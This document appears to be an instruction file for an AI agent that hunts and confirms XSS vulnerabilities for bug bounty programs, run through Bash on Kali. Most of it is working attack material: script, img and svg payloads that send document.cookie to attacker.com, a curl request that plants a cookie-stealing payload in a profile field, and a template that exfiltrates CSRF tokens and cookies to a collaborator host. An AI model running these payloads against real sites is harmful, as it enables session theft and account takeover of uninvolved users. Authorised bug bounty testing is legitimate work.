---
name: xss-tester
description: Find and confirm exploitable XSS vulnerabilities — reflected, stored, DOM-based, and mutation XSS — with a focus on account takeover and session theft impact. Use after hypothesis-agent identifies reflected params, stored input fields, or DOM sinks. Trigger on phrases like "test XSS", "find XSS", "reflected param", "stored input", "DOM sink", "script injection", or any time there's a user-controlled input that reaches an HTML/JS output context.
allowed-tools: Bash
---

# XSS Tester

Target: $ARGUMENTS (URL or ~/bugbounty/target/recon/)

All commands run directly in Kali WSL.

---

## Hard Stop Rules

Do NOT pursue:
- XSS that only triggers on the attacker's own session (self-XSS) — not a finding
- XSS in admin panels where the attacker must already be admin to inject — check program rules
- XSS behind a CSP that blocks all script execution with no bypass path — confirm bypass first
- `alert(1)` as proof of impact — PoC must demonstrate actual session theft, cookie access, or account takeover
- XSS in emails or PDFs unless the program explicitly includes these
- `document.domain` relaxation attacks where the target is sandboxed

Minimum impact to pursue: session cookie theft OR stored XSS that executes for other users OR account takeover via token exfiltration.

---

## Step 0 — Setup

```bash
export PATH=$PATH:~/go/bin
cat ~/bugbounty/knowledge/weak-patterns.md 2>/dev/null
cat ~/bugbounty/knowledge/recon-noise.md 2>/dev/null
```

If target is a directory, find reflected/stored input surfaces from recon:

```bash
find "$ARGUMENTS" -type f | xargs grep -l -i "reflect\|search\|query\|name=\|input\|param\|form" 2>/dev/null | head -10
grep -rh "XSS\|reflect\|input\|search" "$ARGUMENTS"/*.md 2>/dev/null | head -20
```

---

## Step 1 — Map Input Surfaces

For each endpoint in scope, identify inputs that reflect into the response or get stored.

**Categories to test (prioritized):**

1. **Search fields** — query params that echo back into the page (`?q=`, `?search=`, `?name=`)
2. **Error messages** — 404/error pages that reflect the URL or user input
3. **Profile fields** — name, bio, username, address — stored XSS candidates
4. **File upload names** — if filename appears in a listing or notification
5. **Redirect parameters** — `?next=`, `?return=`, `?redirect=` — open redirect → XSS chain
6. **JSON responses that reach the DOM** — API data rendered client-side without encoding

Quick parameter reflection check:

```bash
# Test which params in URLs reflect back — use a canary string
CANARY="xsscanary$(date +%s)"
TARGET_URL="https://TARGET/search?q=$CANARY"

curl -s "$TARGET_URL" \
  -H "Cookie: SESSION" \
  -H "bugcrowd-id: cnsecconsultingptyltd@gmail.com" \
  -H "flatmates-bugcrowd: E277D811-7BE0-4DC1-BDF8-C3B9394E5C69" | grep -c "$CANARY"
```

If canary appears in response: note the context (inside HTML, inside JS, inside attribute, inside JSON).

---

## Step 2 — Identify Output Context

The attack payload depends entirely on where the input lands. Determine the context:

```bash
curl -s "TARGET_URL?PARAM=xsscontexttest" \
  -H "Cookie: SESSION" | grep -A2 -B2 "xsscontexttest"
```

| Context | Looks like | Attack vector |
|---|---|---|
| HTML text node | `<p>xsscontexttest</p>` | `<script>` or `<img onerror>` |
| HTML attribute (quoted) | `value="xsscontexttest"` | `" onmouseover="` |
| HTML attribute (unquoted) | `value=xsscontexttest` | `onmouseover=` |
| JavaScript string | `var x = "xsscontexttest";` | `"; alert(1);//` |
| JavaScript without quotes | `var x = xsscontexttest;` | direct injection |
| URL in href/src | `<a href="xsscontexttest">` | `javascript:` |
| JSON response to client | `{"name":"xsscontexttest"}` | escape JSON → test if rendered |

---

## Step 3 — Payload Testing

**Always test HTML encoding first — if input is HTML-encoded, move on:**

```bash
# Does the app encode < and > ?
curl -s "TARGET_URL?PARAM=<>" | grep -o '[^a-zA-Z0-9]<[^a-zA-Z0-9]'
```

If `<` is encoded to `&lt;` — reflect XSS is mitigated. Check for attribute context instead.

**HTML context payload ladder:**

```bash
# Tier 1: Basic script tag
PAYLOAD='<script>document.location="https://attacker.com/steal?c="+document.cookie</script>'

# Tier 2: Event handler (for when script tags are filtered)
PAYLOAD='"><img src=x onerror=document.location="https://attacker.com/steal?c="+document.cookie>'

# Tier 3: SVG (bypasses some filters)
PAYLOAD='<svg onload=document.location="https://attacker.com/steal?c="+document.cookie>'

# Tier 4: Template literals in JS context
PAYLOAD='`-document.location="https://attacker.com/steal?c="+document.cookie-`'

# URL-encode the payload when sending in query params
python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))"
```

**For bug bounty PoC — use Burp Collaborator or a controlled server, never alert(1):**

```bash
# Set up a quick listener to confirm callback
# Replace with Burp Collaborator URL or your own server
COLLAB="YOUR_BURP_COLLABORATOR_URL"

PAYLOAD="<script>new Image().src='https://$COLLAB/?c='+btoa(document.cookie)</script>"
```

---

## Step 4 — CSP Bypass Assessment

If a CSP header is present, check if it can be bypassed before investing time:

```bash
# Get the CSP header
curl -sI "https://TARGET/" | grep -i content-security-policy
```

Check CSP weaknesses:
- `unsafe-inline` → script injection works directly
- `unsafe-eval` → `eval()` payloads work
- Whitelisted CDN host (e.g. `cdn.jquery.com`) → find an XSS gadget on that CDN
- `data:` allowed in `script-src` → `<script src="data:,alert(1)">`
- Missing `script-src` but has `default-src 'self'` → check if the app hosts JSONP endpoints

```bash
# Check for JSONP endpoints on allowed origins
grep -rh "callback\|jsonp" "$ARGUMENTS" 2>/dev/null | grep -oP 'https?://[^\s"&?]+' | sort -u
```

---

## Step 5 — DOM XSS Analysis

Check for client-side sinks where attacker data flows without sanitization.

Sources: `location.hash`, `location.search`, `document.referrer`, `postMessage`, `localStorage`
Sinks: `innerHTML`, `document.write`, `eval()`, `setTimeout(string)`, `location.href` assignment

```bash
# Download the JS bundle and search for dangerous sinks near URL parameter reads
curl -s "https://TARGET/app.js" > /tmp/target-app.js

# Find innerHTML assignments
grep -n "innerHTML\s*=" /tmp/target-app.js | head -20

# Find document.write
grep -n "document\.write\s*(" /tmp/target-app.js | head -20

# Find eval
grep -n "\beval\s*(" /tmp/target-app.js | head -20

# Find location.hash usage near innerHTML
grep -n "location\.hash" /tmp/target-app.js | head -10
grep -n "location\.search" /tmp/target-app.js | head -10
```

For each sink found, trace the data flow back to see if it reads from a URL-controlled source.

---

## Step 6 — Stored XSS via Profile Fields

For authenticated stored XSS tests:

```bash
# Inject payload into profile name field
curl -s -X PATCH "https://TARGET/api/people/MY_ID" \
  -H "Cookie: SESSION" \
  -H "Content-Type: application/json" \
  -H "X-Csrf-Token: CSRF_TOKEN" \
  -d "{\"name\":\"<img src=x onerror=document.location='https://COLLAB/?c='+btoa(document.cookie)>\"}" | python3 -m json.tool

# Then verify the payload appears in the profile page viewed by another user
curl -s "https://TARGET/api/people/MY_ID" | grep -i "onerror\|onload\|script"
```

If payload is stored unencoded → confirm it executes in a victim's browser context by loading the profile page.

---

## Step 7 — Confirm Impact (no alert PoC)

A reportable XSS PoC must demonstrate one of:
1. **Cookie theft:** `document.location='https://attacker.com/?c='+document.cookie` — cookie received at attacker server
2. **Session token extraction:** Read `localStorage` or `sessionStorage` for auth tokens
3. **Account takeover sequence:** Exfiltrate CSRF token → submit password-change form
4. **Keylogger:** `document.addEventListener('keypress', ...)` — captures credentials
5. **For HttpOnly cookies:** demonstrate that XSS allows CSRF-equivalent actions (submit requests using the victim's session)

```bash
# PoC template — exfiltrate session token
PAYLOAD='<script>
var token = document.querySelector("meta[name=csrf-token]").content;
var cookie = document.cookie;
new Image().src = "https://COLLAB_URL/?token=" + btoa(token) + "&cookie=" + btoa(cookie);
</script>'
```

---

## Step 8 — Document and Triage

Write to `~/bugbounty/TARGET/findings/XSS-$(date +%Y%m%d)-LOCATION.md`:

```bash
cat > ~/bugbounty/TARGET/findings/XSS-$(date +%Y%m%d)-$(echo $PARAM | tr '/?=' '-').md << 'EOF'
# [Stored/Reflected/DOM] XSS — [Location]

**Date:** YYYY-MM-DD  
**URL:** https://TARGET/path?param=PAYLOAD  
**Type:** Reflected / Stored / DOM  
**Severity:** Medium / High (based on cookie flags, auth context, CSP)

## Reproduction

1. Navigate to: `https://TARGET/path?param=PAYLOAD`
2. Observe callback at: https://COLLAB_URL

## Payload Used
```
PAYLOAD_HERE
```

## Response / Evidence
```
RESPONSE_SNIPPET_SHOWING_UNESCAPED_OUTPUT
```

## Impact
[Session theft / Account takeover / Stored XSS visible to all users]

## Notes
[CSP present? HttpOnly cookies? SameSite flags? Login required?]
EOF
```

Run `/triager` before submission.

---

## Common False Positive Patterns (do not report)

Log these to knowledge base when encountered:

```bash
cat >> ~/bugbounty/knowledge/recon-noise.md << 'EOF'
- XSS: reflected input inside HTML comment (<!-- xss -->) — not executable
- XSS: reflected inside style attribute without url() context — limited impact
- XSS: params reflected only in 3rd-party analytics scripts (not same-origin)
- XSS: requires attacker to control X-Forwarded-For header (not via browser)
EOF
```
